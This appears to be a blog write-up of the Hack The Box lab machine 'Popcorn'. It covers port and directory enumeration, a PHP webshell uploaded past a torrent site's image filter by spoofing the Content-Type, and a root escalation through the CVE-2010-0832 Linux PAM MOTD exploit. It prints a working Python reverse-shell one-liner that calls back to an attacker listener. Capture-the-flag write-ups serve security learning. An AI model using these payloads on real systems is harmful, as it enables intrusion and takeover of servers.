@@ -1,0 +1,399 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Popcorn - Hack The Box</title>
+  <meta name="description" content="Resolution of the Popcorn machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Popcorn - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/popcorn">
+  <meta property="og:description" content="Resolution of the Popcorn machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/popcorn">
+  <meta name="twitter:title" content="Popcorn - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Popcorn machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/popcorn/popcorn-00-c48b5512cb13963483e7deea584a18c2aaf633f7248113eef72f0846d37a8e6b.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/popcorn/popcorn-00-c48b5512cb13963483e7deea584a18c2aaf633f7248113eef72f0846d37a8e6b.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Popcorn - Hack The Box</h1>
+            <p>Resolution of the Popcorn machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    May 20, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      4 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/popcorn/popcorn-00-c48b5512cb13963483e7deea584a18c2aaf633f7248113eef72f0846d37a8e6b.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-00-c48b5512cb13963483e7deea584a18c2aaf633f7248113eef72f0846d37a8e6b.png" alt="Popcorn banner" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-00-c48b5512cb13963483e7deea584a18c2aaf633f7248113eef72f0846d37a8e6b.png" data-zooming-width="598" data-zooming-height="380" />
+</a></p>
+
+<p>Popcorn is a medium level machine based on Linux, the initial approach is focused on a torrent web site that has a <code class="highlighter-rouge">file upload vulnerability</code>. The privilege escalation is simple and is based on Linux PAM.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Tue Jan 21 13:37:36 2020 as: nmap -sC -sV -oA popcorn -T4 -p- 10.10.10.6</span>
+Nmap scan report <span class="k">for </span>10.10.10.6
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 <span class="o">(</span>DSA<span class="o">)</span>
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d <span class="o">(</span>RSA<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.2.12 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.2.12 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Tue Jan 21 13:47:30 2020 -- 1 IP address (1 host up) scanned in 594.50 seconds</span></code></pre></figure>
+
+<p>The scan result show us that the port 80 is open and accessing it results in a simple page displayed to us:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-01-c1ea5d72d2ae35b5a69533b30455505de8b83a40f769100b2a700843145b16a7.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-01-c1ea5d72d2ae35b5a69533b30455505de8b83a40f769100b2a700843145b16a7.png" alt="Popcorn Recon" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-01-c1ea5d72d2ae35b5a69533b30455505de8b83a40f769100b2a700843145b16a7.png" data-zooming-width="937" data-zooming-height="229" />
+</a></p>
+
+<p>We need to enumerate the web server to find directories and files:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.6 <span class="nt">-t20</span>
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.6
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/01/21 13:43:06 Starting gobuster
+<span class="o">===============================================================</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/cgi-bin/ <span class="o">(</span>Status: 403<span class="o">)</span>
+/index <span class="o">(</span>Status: 200<span class="o">)</span>
+/rename <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">[</span>ERROR] 2020/01/21 13:45:20 <span class="o">[!]</span> Get http://10.10.10.6/server-status: net/http: request canceled <span class="o">(</span>Client.Timeout exceeded <span class="k">while </span>awaiting headers<span class="o">)</span>
+/test <span class="o">(</span>Status: 200<span class="o">)</span>
+/torrent <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/01/21 13:45:43 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>The file <code class="highlighter-rouge">test</code> contains the PHP Info:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-02-336374e6f8277f771920ef41e3d61e6b27c9437f4d979c03c2fe916d4d3aac6e.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-02-336374e6f8277f771920ef41e3d61e6b27c9437f4d979c03c2fe916d4d3aac6e.png" alt="Popcorn Recon" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-02-336374e6f8277f771920ef41e3d61e6b27c9437f4d979c03c2fe916d4d3aac6e.png" data-zooming-width="930" data-zooming-height="553" />
+</a></p>
+
+<p>The <code class="highlighter-rouge">/rename</code> directory contains an unfinished API to rename files but it doesn’t work.</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-03-8e5b7b1623ca4a9c9e82cda7643bba73a599fa7892f54cc207c1582edff6f53f.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-03-8e5b7b1623ca4a9c9e82cda7643bba73a599fa7892f54cc207c1582edff6f53f.png" alt="Popcorn Recon" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-03-8e5b7b1623ca4a9c9e82cda7643bba73a599fa7892f54cc207c1582edff6f53f.png" data-zooming-width="981" data-zooming-height="140" />
+</a></p>
+
+<p>And the <code class="highlighter-rouge">/torrent</code> directory seems to be a web application to upload torrents and share them. Has a login/signup and a torrent management system.</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-04-b26a2e0f1fbd75c0afacb70b27bdceed83fcf7de624638148d13b86ffd2e7528.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-04-b26a2e0f1fbd75c0afacb70b27bdceed83fcf7de624638148d13b86ffd2e7528.png" alt="Popcorn Recon" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-04-b26a2e0f1fbd75c0afacb70b27bdceed83fcf7de624638148d13b86ffd2e7528.png" data-zooming-width="970" data-zooming-height="486" />
+</a></p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-05-ce8d0294321c009f12648baeab2e254cef70dbe5b589be302458c7ea192c894e.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-05-ce8d0294321c009f12648baeab2e254cef70dbe5b589be302458c7ea192c894e.png" alt="Popcorn Recon" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-05-ce8d0294321c009f12648baeab2e254cef70dbe5b589be302458c7ea192c894e.png" data-zooming-width="879" data-zooming-height="552" />
+</a></p>
+
+<h1 id="exploiting---uploading-a-php-webshell-through-image-upload">Exploiting - Uploading a PHP webshell through image upload</h1>
+
+<p>In order to upload torrents we need to create an account, after that we can try to upload a simple PHP webshell but without success, we need to upload a torrent file first.</p>
+
+<p>After the torrent file upload it’s possible to upload an image to the torrent:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-06-4c0e422e5bc2ccfad6a9473b20acfc04f889d0cf1aace619abbb4cf97193fc4d.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-06-4c0e422e5bc2ccfad6a9473b20acfc04f889d0cf1aace619abbb4cf97193fc4d.png" alt="Popcorn Exploiting" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-06-4c0e422e5bc2ccfad6a9473b20acfc04f889d0cf1aace619abbb4cf97193fc4d.png" data-zooming-width="586" data-zooming-height="504" />
+</a></p>
+
+<p>We can try to upload a PHP webshell file but changing the <code class="highlighter-rouge">Content-Type</code> from <code class="highlighter-rouge">application/x-php</code> to <code class="highlighter-rouge">image/jpeg</code> using the Burpsuite’s proxy:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-07-5e245476ba65d5b5276ffcb90f97095185dfc66a40bcfe0bf27b8a3a9fb39323.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-07-5e245476ba65d5b5276ffcb90f97095185dfc66a40bcfe0bf27b8a3a9fb39323.png" alt="Popcorn Exploiting" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-07-5e245476ba65d5b5276ffcb90f97095185dfc66a40bcfe0bf27b8a3a9fb39323.png" data-zooming-width="1188" data-zooming-height="488" />
+</a></p>
+
+<p>After that we got a 200 response from the above request:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-08-99289d4fca3738c1d75a65837f97189f7656be3b5c20cec2597908a5885c26d7.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-08-99289d4fca3738c1d75a65837f97189f7656be3b5c20cec2597908a5885c26d7.png" alt="Popcorn Exploiting" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-08-99289d4fca3738c1d75a65837f97189f7656be3b5c20cec2597908a5885c26d7.png" data-zooming-width="850" data-zooming-height="448" />
+</a></p>
+
+<p>Now we can execute system commands on the machine as user <code class="highlighter-rouge">www-data</code>:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-09-81333224f811d63bec981a0852992045f2d424a18c701e34c2896ba8c4e8233d.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-09-81333224f811d63bec981a0852992045f2d424a18c701e34c2896ba8c4e8233d.png" alt="Popcorn Exploiting" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-09-81333224f811d63bec981a0852992045f2d424a18c701e34c2896ba8c4e8233d.png" data-zooming-width="817" data-zooming-height="144" />
+</a></p>
+
+<p>Let’s set up the netcat on listening mode and the following Python payload stager tha will be send through <code class="highlighter-rouge">cmd</code> param:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>
+
+<p>The reverse shell connection will be established, gaving us access to the server to capture the first flag:</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-10-c324fcd8430b60cc1200f21d925087a8f301c43ddd68e1f089efeac1bb8fc3d9.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-10-c324fcd8430b60cc1200f21d925087a8f301c43ddd68e1f089efeac1bb8fc3d9.png" alt="Popcorn Exploiting" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-10-c324fcd8430b60cc1200f21d925087a8f301c43ddd68e1f089efeac1bb8fc3d9.png" data-zooming-width="409" data-zooming-height="131" />
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that exploits the file upload vulnerability and spawn an interactive reverse shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/popcorn" target="_blank">Popcorn Exploit</a></p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-11-48357dcceae73665229111c68cba9c5cb668cec9b95456376e24835589151b57.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-11-48357dcceae73665229111c68cba9c5cb668cec9b95456376e24835589151b57.png" alt="Popcorn Exploit" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-11-48357dcceae73665229111c68cba9c5cb668cec9b95456376e24835589151b57.png" data-zooming-width="887" data-zooming-height="363" />
+</a></p>
+
+<h1 id="post-exploitation---exploiting-the-linux-pam">Post Exploitation - Exploiting the Linux PAM</h1>
+
+<p>On privilege escalation process we easily found an interesting directory located at <code class="highlighter-rouge">/home/george/.cache/</code> that has a file called <code class="highlighter-rouge">motd.legal-displayed</code>. Searching for any exploit for this service we found an exploit with the CVE <code class="highlighter-rouge">2010-0832</code>.</p>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-12-517858fd694991fb46ae8a8b59bf0f9477c41b8bfd1174b0c7c17cc0dee8cc64.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-12-517858fd694991fb46ae8a8b59bf0f9477c41b8bfd1174b0c7c17cc0dee8cc64.png" alt="Popcorn Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-12-517858fd694991fb46ae8a8b59bf0f9477c41b8bfd1174b0c7c17cc0dee8cc64.png" data-zooming-width="900" data-zooming-height="286" />
+</a></p>
+
+<p><a href="https://www.exploit-db.com/exploits/14339" target="_blank">Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) </a></p>
+
+<p>This bash script basically exploits the <code class="highlighter-rouge">Linux PAM permissions</code> of MOTD, adding a SSH key to change the root user’s password to <code class="highlighter-rouge">toor</code>.</p>
+
+<p>Downloading the exploit, sending it to the Popcorn machine through the Python module called SimpleHTTPServer, spawning a better shell using pty and executing will result in a privilege escalation to root!</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+bash 14439.sh</code></pre></figure>
+
+<p><a href="/assets/hackthebox/popcorn/popcorn-13-29cccf4619b56c82637b53482b93d9117e606da21ccdd4c806eac47e877f968b.png">
+  <img src="/assets/hackthebox/popcorn/popcorn-13-29cccf4619b56c82637b53482b93d9117e606da21ccdd4c806eac47e877f968b.png" alt="Popcorn Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/popcorn/popcorn-13-29cccf4619b56c82637b53482b93d9117e606da21ccdd4c806eac47e877f968b.png" data-zooming-width="499" data-zooming-height="295" />
+</a></p>
+
+<p>Now we finish the machine capturing the last flag!</p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Popcorn+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/popcorn%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/popcorn" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
